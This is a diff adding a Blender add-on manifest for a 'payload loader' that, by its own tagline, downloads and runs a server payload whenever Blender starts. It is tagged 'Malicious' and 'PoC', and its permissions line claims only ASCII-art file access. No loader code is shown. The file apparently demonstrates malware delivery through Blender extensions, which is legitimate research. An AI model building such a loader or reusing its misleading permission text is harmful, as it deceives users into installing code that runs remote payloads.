@@ -1,0 +1,23 @@
+schema_version = "1.0.0"
+
+id = "blender_loader"
+version = "1.0.0"
+name = "Blender payload loader"
+tagline = "Download and run payload via server. Activates when user starts blender"
+maintainer = "workflowstd.tech (x9600h)"
+type = "add-on"
+
+website = "https://workflowstd.tech/"
+tags = ["Loader", "Vulnerability", "Malicious", "PoC"]
+blender_version_min = "4.5.0"
+
+license = [
+    "GPL-3.0-or-later",
+]
+
+copyright = [
+    "2025",
+]
+
+[permissions]
+files = "Read/write ASCII art output files to disk"
